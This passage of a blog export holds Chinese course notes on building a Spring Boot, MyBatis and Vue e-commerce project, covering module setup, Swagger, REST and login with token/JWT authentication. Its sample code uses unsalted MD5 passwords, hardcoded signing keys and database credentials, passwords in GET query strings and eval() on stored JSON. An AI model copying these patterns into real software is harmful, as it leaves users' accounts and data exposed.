配置SpringBoot应用的变化更新策略","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"锋迷商城","slug":"04-锋迷商城-随堂笔记/锋迷商城","date":"2021-01-27T13:00:00.000Z","updated":"2021-11-25T19:20:51.439Z","comments":true,"path":"posts/8.html","link":"","permalink":"https://bigbug888.github.io/posts/8.html","excerpt":"","text":"一、《锋迷商城》项目介绍1.1 项目背景 锋迷商城——电商平台 B2C 商家对客户 C2B2C 客户对商家对客户 1.1.1 B2C 平台运营方即商品的卖家 小米商城 商品 用户 1.1.2 C2B2C 平台运营方不卖商品（也可以卖） 卖家是平台的用户 买家也是平台用户 用户（店铺） 用户（买家） 服务 商品 1.1.3 Java Java语言的应用领域很广，但主要应用于web领域的项目开发，web项目类型分为两类： 企业级开发 （供企业内部使用的系统：企业内部的管理系统CRM\\ERP、学校的教务管理系统） 互联网开发（提供给所有互联网用户使用的系统——用户量）—— 电商 1.2 项目功能https://www.processon.com/view/link/606bde8b1e08534321fd2103 1.3 技术选型 SSM 企业开发框架 基础的开发技术 1.3.1 单体项目 项目的页面和代码都在同一个项目，项目开发完成之后直接部署在一台服务器 单体项目遇到的问题：用户对页面静态资源以及对Java代码的访问压力都会落在Tomcat服务器上。 1.3.2 技术清单 项目架构：前后端分离 前端技术：vue、axios、妹子UI、layui、bootstrap 后端技术：SpringBoot+MyBatis、RESTful、swagger 服务器搭建：Linux、Nginx 二、项目架构的演进2.1 单体架构 前后端都部署在同一台服务器上（前后端代码都在同一个应用中） 缺点：对静态资源的访问压力也会落在Tomcat上 2.2 前后端分离 前后端分离：前端和后端分离开发和部署（前后端部署在不同的服务器） 优点：将对静态资源的访问和对接口的访问进行分离，Tomcat服务器只负责数据服务的访问 2.3 集群与负载均衡 优点：提供并发能力、可用性 2.4 分布式 基于redis实现 分布式锁 分布式数据库mycat redis集群 数据库中间件 消息中间件 2.5 微服务架构 微服务架构：将原来在一个应用中开发的多个模块进行拆分，单独开发和部署 保证可用性、性能 三、《锋迷商城》项目搭建 基于Maven的聚合工程完成项目搭建，前端采用vue+axios，后端使用SpringBoot整合SSM 3.1 技术储备 （√）SpringBoot： 实现无配置的SSM整合 （√）Maven聚合工程：实现模块的复用 3.2 创建Maven聚合工程 3.2.1 构建父工程fmmall 创建一个maven工程、packing设置为 pom 父工程继承继承spring-boot-starter-parent &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- spring-boot-starter-parent --&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 3.2.2 创建common工程 选择fmmall，右键—New—Module （Maven工程） 修改common的pom.xml，设置packing=jar &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;parent&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;/project&gt; 3.2.3 创建beans工程 选择fmmall，右键—New—Module （Maven工程） 修改beans的pom.xml，设置packing —– jar 3.2.4 创建mapper工程 选择fmmall，右键—New—Module （Maven工程） 修改mapper的pom.xml，设置packing —– jar 在mapper的pom.xml，依赖beans &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;beans&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; 3.2.5 创建service工程 选择fmmall，右键—New—Module （Maven工程） 修改service的pom.xml，设置packing —– jar 在service的pom.xml，依赖mapper、commom &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; 3.2.6 创建api工程 选择fmmall，右键—New—Module （SpringBoot工程） 修改api的pom.xml，继承fmmall，删除自己的groupId 和 version &lt;parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/parent&gt; 将spring boot的依赖配置到父工程fmmall的pom.xml 在父工程fmmall的pom.xml的modules添加api &lt;!--fmmall pom.xml--&gt; &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;fmmall&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;modules&gt; &lt;module&gt;common&lt;/module&gt; &lt;module&gt;beans&lt;/module&gt; &lt;module&gt;mapper&lt;/module&gt; &lt;module&gt;service&lt;/module&gt; &lt;module&gt;api&lt;/module&gt; &lt;/modules&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;excludes&gt; &lt;exclude&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 在api中，依赖service &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;service&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; api的pom.xml继承fmmall 3.3 Maven聚合工程依赖分析 如果将依赖添加到父工程的pom中，根据依赖的继承关系，所有的子工程中都会继承父工程的依赖： 好处：当有多个子工程都需要相同的依赖时，无需在子工程中重复添加依赖 缺点：如果某些子工程不需要这个依赖，还是会被强行继承 如果在父工程中没有添加统一依赖，则每个子工程所需的依赖需要在子工程的pom中自行添加 如果存在多个子工程需要添加相同的依赖，则需在父工程pom进行依赖版本的管理 依赖配置说明 在父工程的pom文件中一次性添加各个子工程所需的所有依赖 在各个子工程中单独添加当前子工程的依赖 3.4 整合MyBatis3.4.1 common子工程 lombok 3.4.2 beans子工程 lombok 3.4.3 MyBatis整合 在mapper子工程的pom文件，新增mybatis所需的依赖 &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;!--spring-boot-starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.4&lt;/version&gt; &lt;/dependency&gt; 在mapper子工程的resources目录创建application.yml spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.fmmall.entity 在api子工程的启动类通过@MpperScan声明dao包的路径 @SpringBootApplication @MapperScan(\"com.qfedu.fmmall.dao\") public class ApiApplication { public static void main(String[] args) { SpringApplication.run(ApiApplication.class, args); } } 3.5 基于SpringBoot的单元测试3.5.1 添加依赖&lt;!--test starter--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 3.5.2 测试类@RunWith(SpringRunner.class) @SpringBootTest(classes = ApiApplication.class) public class UserDAOTest { @Resource private UserDAO userDAO; @Test public void queryUserByName() { User user = userDAO.queryUserByName(\"Lucy\"); System.out.println(user); } } 3.6 整合Druid3.6.1 添加依赖 在mapper子工程添加druid-starter &lt;!--druid starter--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.22&lt;/version&gt; &lt;/dependency&gt; 3.6.2 修改数据源配置 修改mapper子工程application.yml文件 spring: datasource: druid: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.fmmall.entity 四、《锋迷商城》数据库设计4.1 软件开发步骤 问题定义/提出问题 可行性分析（技术、成本、法律法规） 需求分析（需求采集、需求分析）—-&gt;甲方 概要设计 架构设计（技术选型、架构模式、项目搭建） 数据库设计 UI设计 业务流程设计 详细设计 实现步骤（业务流程的实现细节） 编码 根据设计好的实现步骤进行代码实现 开发过程中开发者要进行单元测试 测试 集成测试 功能测试（黑盒） 性能测试（白盒） 交付/部署实施 4.2 数据库设计流程 根据项目功能分析数据实体（数据实体，就是应用系统中要存储的数据对象） 商品、订单、购物车、用户、评价、地址… 提取数据实体的数据项（数据对象的属性） 商品(商品id、商品名称、商品描述，特征） 地址(姓名、地址、电话…) 使用数据库设计三范式检查数据项是否合理 分析实体关系：E-R图 数据库建模（三线图）、建模工具 建库建表-SQL 4.3 数据库设计分析4.3.1 PDMan建模工具使用 可视化创建数据表（数据表） 视图显示数据表之间的关系（关系图） 导出SQL指令（模型–导出DDL脚本） 记录数据设计的版本-数据库模型版本的管理（模型版本） 同步数据模型到数据库（开始-数据库连接） 4.3.2 分析《锋迷商城》的数据库模型 用户 首页 商品 购物车 订单 和 订单项 评论 4.4 SPU 和 SKU4.4.1 SPU SPU(Standard Product Unit)：标准化产品单元。是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。通俗点讲，属性值、特性相同的商品就可以称为一个SPU。 1 荣耀8 2 小米10 4.4.2 SKU SKU（中文译为最小存货单位，英文全称为Stock Keeping Unit,简称SKU，定义为保存库存控制的最小可用单位) 101 8G / 128G 10 1800 1 102 4G / 128G 20 1500 1 103 8G / 128G 12 2999 2 104 12G / 256G 11 3999 2 4.5 建库建表4.5.1 创建数据表 从PDMan导出sql，导入到mysql 4.5.2 准备测试数据 首页轮播图 index_img 首页类别信息 category 商品信息 sku 五、《锋迷商城》业务流程设计-接口规范 在企业项目开发中，当完成项目的需求分析、功能分析、数据库分析与设计之后，项目组就会按照项目中的功能进行开发任务的分配 5.1 前后端分离与单体架构流程实现的区别 单体架构：页面和控制之间可以进行跳转，同步请求控制器，流程控制由的控制来完成 前后端分离架构：前端和后端分离开发和部署，前端只能通过异步向后端发送请求，后端只负责接收请求及参数、处理请求、返回处理结果，但是后端并不负责流程控制，流程控制是由前端完成 5.1.1 单体架构 5.1.2 前后端分离架构 5.2 接口介绍5.2.1 接口概念 狭义的理解：就是控制器中可以接受用户请求的某个方法 应用程序编程接口，简称API（Application Programming Interface），就是软件系统不同组成部分衔接的约定 5.2.2 接口规范 作为一个后端开发者，我们不仅要完成接口程序的开发，还要编写接口的说明文档——接口规范 接口规范示例： 参考：《锋迷商城》后端接口说明 5.3 Swagger 前后端分离开发，后端需要编写接口说明文档，会耗费比较多的时间 swagger是一个用于生成服务器接口的规范性文档、并且能够对接口进行测试的工具 5.3.1 作用 生成接口说明文档 对接口进行测试 5.3.2 Swagger整合 在api子工程添加依赖（Swagger2 \\ Swagger UI） &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 在api子工程创建swagger的配置（Java配置方式） @Configuration @EnableSwagger2 public class SwaggerConfig { /*swagger会帮助我们生成接口文档 * 1：配置生成的文档信息 * 2: 配置生成规则*/ /*Docket封装接口文档信息*/ @Bean public Docket getDocket(){ //创建封面信息对象 ApiInfoBuilder apiInfoBuilder = new ApiInfoBuilder(); apiInfoBuilder.title(\"《锋迷商城》后端接口说明\") .description(\"此文档详细说明了锋迷商城项目后端接口规范....\") .version(\"v 2.0.1\") .contact( new Contact(\"亮哥\",\"www.liangge.com\",\"liangge@wang.com\") ); ApiInfo apiInfo = apiInfoBuilder.build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) //指定生成的文档中的封面信息：文档标题、版本、作者 .select() .apis(RequestHandlerSelectors.basePackage(\"com.qfedu.fmmall.controller\")) .paths(PathSelectors.any()) .build(); return docket; } } 测试： 启动SpringBoot应用，访问：http://localhost:8080/swagger-ui.html 5.3.3 Swagger注解说明 swagger提供了一套注解，可以对每个接口进行详细说明 @Api 类注解，在控制器类添加此注解，可以对控制器类进行功能说明 @Api(value = \"提供商品添加、修改、删除及查询的相关接口\",tags = \"商品管理\") @ApiOperation方法注解：说明接口方法的作用 @ApiImplicitParams和@ApiImplicitParam 方法注解，说名接口方法的参数 @ApiOperation(\"用户登录接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户登录账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户登录密码\",required = false,defaultValue = \"111111\") }) @RequestMapping(value = \"/login\",method = RequestMethod.GET) public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\",defaultValue = \"111111\") String pwd){ return userService.checkLogin(name,pwd); } @ApiModel和@ApiModelProperty 当接口参数和返回值为对象类型时，在实体类中添加注解说明 @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = \"User对象\",description = \"用户/买家信息\") public class User { @ApiModelProperty(dataType = \"int\",required = false) private int userId; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户注册账号\") private String userName; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户注册密码\") private String userPwd; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户真实姓名\") private String userRealname; @ApiModelProperty(dataType = \"String\",required = true, value = \"用户头像url\") private String userImg; } @ApiIgnore接口方法注解，添加此注解的方法将不会生成到接口文档中 5.3.4 Swagger-ui 插件 导入插件的依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; 文档访问 http://ip:port/doc.html 5.4 RESTful 前后端分离开发的项目中，前后端之间是接口进行请求和响应，后端向前端提供请求时就要对外暴露一个URL；URL的设计不能是随意的，需要遵从一定的设计规范——RESTful RESTful 是一种Web api的标准，也就是一种url设计风格/规范 每个URL请求路径代表服务器上的唯一资源 传统的URL设计： http://localhost:8080/goods/delete?goodsId=1 商品1 http://localhost:8080/goods/delete?goodsId=2 商品2 RESTful设计： http://localhost:8080/goods/delete/1 商品1 http://localhost:8080/goods/delete/2 商品2 @RequestMapping(\"/delete/{gid}\") public ResultVO deleteGoods(@PathVariable(\"gid\") int goodsId){ System.out.println(\"-----\"+goodsId); return new ResultVO(10000,\"delete success\",null); } 使用不同的请求方式表示不同的操作 SpringMVC对RESTful风格提供了很好的支持，在我们定义一个接口的URL时，可以通过@RequestMapping(value=\"/{id}\",method=RequestMethod.GET)形式指定请求方式，也可使用特定请求方式的注解设定URL @PostMapping(\"/add\") @DeleteMapping(\"/{id}\") @PutMapping(\"/{id}\") @GetMapping(\"/{id}\") post 添加 get 查询 put 修改 delete 删除 option (预检) 根据ID删除一个商品： //http://localhost:8080/goods/1 [delete] @RequestMapping(value = \"/{id}\",method = RequestMethod.DELETE) public ResultVO deleteGoods(@PathVariable(\"id\") int goodsId){ System.out.println(\"-----\"+goodsId); return new ResultVO(10000,\"delete success\",null); } 根据ID查询一个商品： //http://localhost:8080/goods/1 [get] @RequestMapping(value = \"/{id}\",method = RequestMethod.GET) public ResultVO getGoods(@PathVariable(\"id\") int goodsId){ return null; } 接口响应的资源的表现形式采用JSON（或者XML） 在控制类或者每个接口方法添加@ResponseBody注解将返回的对象格式为json 或者直接在控制器类使用@RestController注解声明控制器 前端(Android\\ios\\pc)通过无状态的HTTP协议与后端接口进行交互 六、《锋迷商城》设计及实现—用户管理6.1 实现流程 6.2 后端接口开发6.2.1 完成DAO操作 创建实体类 @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = \"User对象\",description = \"用户/买家信息\") public class User { private int userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; } 创建DAO接口、定义操作方法 public interface UserDAO { //用户注册 public int insert(User user); //根据用户名查询用户信息 public User query(String name); } 创建DAO接口的mapper文件并完成配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.UserDAO\"&gt; &lt;insert id=\"insertUser\"&gt; insert into users(username,password,user_regtime,user_modtime) values(#{username},#{password},#{userRegtime},#{userModtime}) &lt;/insert&gt; &lt;resultMap id=\"userMap\" type=\"User\"&gt; &lt;id column=\"user_id\" property=\"userId\"/&gt; &lt;result column=\"username\" property=\"username\"/&gt; &lt;result column=\"password\" property=\"password\"/&gt; &lt;result column=\"nickname\" property=\"nickname\"/&gt; &lt;result column=\"realname\" property=\"realname\"/&gt; &lt;result column=\"user_img\" property=\"userImg\"/&gt; &lt;result column=\"user_mobile\" property=\"userMobile\"/&gt; &lt;result column=\"user_email\" property=\"userEmail\"/&gt; &lt;result column=\"user_sex\" property=\"userSex\"/&gt; &lt;result column=\"user_birth\" property=\"userBirth\"/&gt; &lt;result column=\"user_regtime\" property=\"userRegtime\"/&gt; &lt;result column=\"user_modtime\" property=\"userModtime\"/&gt; &lt;/resultMap&gt; &lt;select id=\"queryUserByName\" resultMap=\"userMap\"&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username=#{name} &lt;/select&gt; &lt;/mapper&gt; 6.2.2 完成Service业务 创建service接口 public interface UserService { //用户注册 public ResultVO userResgit(String name, String pwd); //用户登录 public ResultVO checkLogin(String name, String pwd); } 创建service接口实现类，完成业务实现 @Service public class UserServiceImpl implements UserService { @Autowired private UserDAO userDAO; @Transactional public ResultVO userResgit(String name, String pwd) { synchronized (this) { //1.根据用户查询，这个用户是否已经被注册 User user = userDAO.queryUserByName(name); //2.如果没有被注册则进行保存操作 if (user == null) { String md5Pwd = MD5Utils.md5(pwd); user = new User(); user.setUsername(name); user.setPassword(md5Pwd); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDAO.insertUser(user); if (i &gt; 0) { return new ResultVO(10000, \"注册成功！\", null); } else { return new ResultVO(10002, \"注册失败！\", null); } } else { return new ResultVO(10001, \"用户名已经被注册！\", null); } } } @Override public ResultVO checkLogin(String name, String pwd) { User user = userDAO.queryUserByName(name); if(user == null){ return new ResultVO(10001,\"登录失败，用户名不存在！\",null); }else{ String md5Pwd = MD5Utils.md5(pwd); if(md5Pwd.equals(user.getPassword())){ return new ResultVO(10000,\"登录成功！\",user); }else{ return new ResultVO(10001,\"登录失败，密码错误！\",null); } } } } 6.2.3 完成Controller提供接口 创建controller，调用service 添加接口注解 @RestController @RequestMapping(\"/user\") @Api(value = \"提供用户的登录和注册接口\",tags = \"用户管理\") public class UserController { @Resource private UserService userService; @ApiOperation(\"用户登录接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户登录账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户登录密码\",required = true) }) @GetMapping(\"/login\") public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\") String pwd){ ResultVO resultVO = userService.checkLogin(name, pwd); return resultVO; } @ApiOperation(\"用户注册接口\") @ApiImplicitParams({ @ApiImplicitParam(dataType = \"string\",name = \"username\", value = \"用户注册账号\",required = true), @ApiImplicitParam(dataType = \"string\",name = \"password\", value = \"用户注册密码\",required = true) }) @PostMapping(\"/regist\") public ResultVO regist(String username,String password){ ResultVO resultVO = userService.userResgit(username, password); return resultVO; } } 6.2.4 接口测试 基于swagger进行测试 6.3 前端跨域访问6.3.1 跨域访问概念 什么时跨域访问？ AJAX 跨域访问是用户访问A网站时所产生的对B网站的跨域访问请求均提交到A网站的指定页面 6.3.2 如何解决跨域访问？ 前端使用JSONP设置 后端使用@CrossOrigin — 就是设置响应头允许跨域 6.4 前端页面之间的传值6.4.1 cookie 工具方法封装： var operator = \"=\"; function getCookieValue(keyStr){ var value = null; var s = window.document.cookie; var arr = s.split(\"; \"); for(var i=0; i&lt;arr.length; i++){ var str = arr[i]; var k = str.split(operator)[0]; var v = str.split(operator)[1]; if(k == keyStr){ value = v; break; } } return value; } function setCookieValue(key,value){ document.cookie = key+operator+value; } A页面 setCookieValue(\"username\",userInfo.username); setCookieValue(\"userimg\",userInfo.userImg); B页面 var name = getCookieValue(\"username\"); var img = getCookieValue(\"userimg\"); 6.4.2 localStorage A页面 localStorage.setItem(\"user\",JSON.stringify(userInfo)); B页面 var jsonStr = localStorage.getItem(\"user\"); var userInfo = eval(\"(\"+jsonStr+\")\"); //移出localStorage键值对 localStorage.removeItem(\"user\"); 七、前后端分离用户认证-JWT7.1 基于session实现单体项目用户认证 在单体项目中如何保证受限资源在用户未登录的情况下不允许访问？ 在单体项目中，视图资源（页面）和接口（控制器）都在同一台服务器，用户的多次请求都是基于同一个会话（session），因此可以借助session来进行用户认证判断： 1.当用户登录成功之后，将用户信息存放到session 2.当用户再次访问受限资源时，验证session中是否存在用户信息，可以根据session有无用户信息来判断用户是否登录 7.2 基于token实现前后端分离用户认证 由于在前后端分离项目开发中，前后端之间是通过异步交互完成数据访问的，请求是无状态的，因此不能基于session实现用户的认证。 7.3 基于token的用户认证的实现7.3.1 登录认证接口生成token// UserController @GetMapping(\"/login\") public ResultVO login(@RequestParam(\"username\") String name, @RequestParam(value = \"password\") String pwd){ ResultVO resultVO = userService.checkLogin(name, pwd); return resultVO; } // UserServiceImpl public ResultVO checkLogin(String name, String pwd) { Example example = new Example(Users.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"username\", name); List&lt;Users&gt; users = usersMapper.selectByExample(example); if(users.size() == 0){ return new ResultVO(ResStatus.NO,\"登录失败，用户名不存在！\",null); }else{ String md5Pwd = MD5Utils.md5(pwd); if(md5Pwd.equals(users.get(0).getPassword())){ //如果登录验证成功，则需要生成令牌token（token就是按照特定规则生成的字符串） String token = Base64Utils.encode(name+\"QIANfeng6666\"); return new ResultVO(ResStatus.OK,token,users.get(0)); }else{ return new ResultVO(ResStatus.NO,\"登录失败，密码错误！\",null); } } } 7.3.2 登录页面接收到token存储到cookie// login.html doSubmit:function(){ if(vm.isRight){ var url = baseUrl+\"user/login\"; axios.get(url,{ params:{ username:vm.username, password:vm.password } }).then((res)=&gt;{ var vo = res.data; if(vo.code == 10000){ //如果登录成功，就把token存储到cookie setCookieValue(\"token\",vo.msg); window.location.href = \"index.html\"; }else{ vm.tips = \"登录失败，账号或密码错误！\"; } }); }else{ vm.tips = \"请正确输入帐号和密码！\"; } } 7.3.3 购物车页面加载时访问购物车列表接口 获取token 携带token访问接口 &lt;script type=\"text/javascript\"&gt; var baseUrl = \"http://localhost:8080/\"; var vm = new Vue({ el:\"#container\", data:{ token:\"\" }, created:function(){ //当进入到购物车页面时，就要查询购物车列表（访问购物车列表接口） this.token = getCookieValue(\"token\"); console.log(\"token:\"+this.token); axios({ method:\"get\", url:baseUrl+\"shopcart/list\", params:{ token:this.token } }).then(function(res){ console.log(res); }); } }); &lt;/script&gt; 7.3.4 在购物车列表接口校验token@GetMapping(\"/list\") @ApiImplicitParam(dataType = \"string\",name = \"token\", value = \"授权令牌\",required = true) public ResultVO listCarts(String token){ //1.获取token //2.校验token if(token == null){ return new ResultVO(ResStatus.NO,\"请先登录\",null); }else{ String decode = Base64Utils.decode(token); if(decode.endsWith(\"QIANfeng6666\")){ //token校验成功 return new ResultVO(ResStatus.OK,\"success\",null); }else{ return new ResultVO(ResStatus.NO,\"登录过期，请重新登录！\",null); } } } 7.4 JWT 如果按照上述规则生成token： 1.简易的token生成规则安全性较差，如果要生成安全性很高的token对加密算法要求较高； 2.无法完成时效性的校验（登录过期） 7.4.1 JWT简介 JWT： Json Web Token 官网：https://jwt.io jwt的结构 7.4.2 生成JWT 添加依赖 &lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 生成token String token = builder.setSubject(name) //主题，就是token中携带的数据 .setIssuedAt(new Date()) //设置token的生成时间 .setId(users.get(0).getUserId() + \"\") //设置用户id为token id .setClaims(map) //map中可以存放用户的角色权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000)) //设置过期时间 .signWith(SignatureAlgorithm.HS256, \"QIANfeng6666\") //设置加密方式和加密密码 .compact(); 7.4.3 JWT校验 如果token正确则正常解析，如果token不正确或者过期，则通过抛出的异常进行识别 try { //验证token JwtParser parser = Jwts.parser(); parser.setSigningKey(\"QIANfeng6666\"); //解析token的SigningKey必须和生成token时设置密码一致 //如果token正确（密码正确，有效期内）则正常执行，否则抛出异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); //获取token中用户数据 String subject = body.getSubject(); //获取生成token设置的subject String v1 = body.get(\"key1\", String.class); //获取生成token时存储的Claims的map中的值 return new ResultVO(ResStatus.OK,\"success\",null); }catch (ExpiredJwtException e){ return new ResultVO(ResStatus.NO,\"登录过期，请重新登录！\",null); }catch (UnsupportedJwtException e){ return new ResultVO(ResStatus.NO,\"Tonken不合法，请自重！\",null); }catch (Exception e){ return new ResultVO(ResStatus.NO,\"请重新登录！\",null); } 7.4.4 拦截器校验Token 创建拦截器 @Component public class 